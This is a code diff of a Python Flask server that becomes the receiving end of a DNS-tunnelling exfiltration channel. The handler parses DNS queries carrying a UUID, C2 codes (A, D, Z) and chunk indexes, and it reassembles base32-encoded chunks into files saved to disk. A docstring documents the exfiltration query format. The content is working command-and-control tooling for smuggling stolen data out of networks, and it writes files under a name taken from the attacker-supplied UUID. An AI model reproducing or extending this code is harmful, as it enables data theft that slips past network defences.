@@ -20,11 +20,13 @@ import time
 app = Flask(__name__)
 PATH = os.getcwd()
 
+file_uuids = []
+file_chunks = {}
+num_chunks = 0
 
 
 @app.route('/dns', methods=['GET', 'POST'])
 def return_dns():
-    print('gotta hit')
     if request.method == "POST":
         print('taht was a post')
         print(request.values)
@@ -32,42 +34,80 @@ def return_dns():
         # print(request.args)
         query = request.args.get('dns')
         query = query + "==="
-        print(query)
-        #query_to_bytes = query.encode()
-        #print(query_to_bytes)
-        #return
-        #print(dns.name.from_wire(query, 0))
-        ##message = dns.name.from_wire(query, 0)
-        #print(message)
-
         message = base64.b64decode(query)
 
-        dns_message = dns.name.from_wire(message,12)
-        print(dns_message)
-        return
+        dns_message = dns.name.from_wire(message,12)[0]
+        
+        dns_message_str = str(dns_message) 
+        info = dns_message_str.split('.')
+        """
+        #this query is destined for this listener, need to extra the UUID to
+        determine if the file is already in transit or a new file, then start receiving the data
+        
+        dns query format:
+        C2 codes
+        A = setup query
+        D = data query
+        Z = file upload finished
+        1. send setup_query, coded with A and number of file chunks
+        2. send file_chunk_query, coded with D, each file chunk identified by its index
+        3. send finish_query query with Z, denoting complete
 
-        hex = base64.b64decode(query).encode('hex')
-        print("b64decode: ", message)
-        print("encodehex: ", hex)
-        return
-        #message = dns.name.from_wire(base64.b64decode(query), 0)
-        print("urlsafe decode: ", base64.urlsafe_b64decode(query))
-        #message2 = dns.name.from_wire(base64.urlsafe_b64decode(query), 0)
-        print("standard_b64decode: ", base64.standard_b64decode(query))
-        #message3 = dns.name.from_wire(base64.standard_b64decode(query), 0)
+        setup_query = UUID.CODE.NUMCHUNKS.TOPLEVELDOMAIN.com
+        data_query = UUID.CODE.index.file_data.TOPLEVELDOMAIN.com
+        finish_query = UUID.code.final_index.topleveldomain.com
+        """
 
-        temp = dns.rdata.from_wire(rdclass= dns.rdataclass.IN , \
-            rdtype=dns.rdatatype.A, \
-            wire = base64.urlsafe_b64decode(query), \
-                current = 0, \
-                rdlen = len(base64.urlsafe_b64decode(query)))
+        #info[0] = uuid
+        #info[1] = c2code
+        #info[2] = index
+        uuid = info[0]
 
-        #print(decoded)
-        #print(decoded.decode('utf-8'))
+        if uuid not in file_chunks.keys():
+            file_chunks[uuid] = []
 
-        # print(request.args.getlist())
+        c2code = info[1]
 
-    return "Hello dns"
+        index = int(info[2])
+
+        if c2code == 'A':
+            global num_chunks
+            num_chunks = index
+            print("Num chunks = ", num_chunks)
+            print("start of file, num_chunks = ", num_chunks)
+            file_chunks[uuid] =  [None] * num_chunks    #create the list with the total index length
+            print("The length of the file_chunks list is: ", len(file_chunks[uuid]))
+
+        if c2code == 'D':
+            #print("UUID: ", uuid)
+            #print("INDEX: " , index)
+            #print("INFO: " , info[3])
+            file_chunks[uuid][index] = info[3]
+            #print(file_chunks[uuid][index])
+        
+        if c2code == 'Z':
+            print('end of file')
+            #print(file_chunks[uuid])
+            save_base32_file(uuid, file_chunks[uuid])
+
+
+
+        #print(dns_message.labels)
+        return "Hello dns"
+def save_base32_file(file_name, file_data):
+    #saves a file with name file_name, going over a list of data chunks that are base32 encoded, 
+    # converts them back to byte data, and saves the file
+    f = open(f"receive/{file_name}", 'wb')
+    for data in file_data:
+        #first, convert from b32 back to data string
+        #then, conver str to byte data
+        #then, write to file
+        b32_decode_str = base64.b32decode(data)
+        print(b32_decode_str)
+        #b#yte_data = str.encode(b32_decode_str)
+        #p#rint(byte_data)
+        f.write(b32_decode_str)
+    f.close()
 
 
 
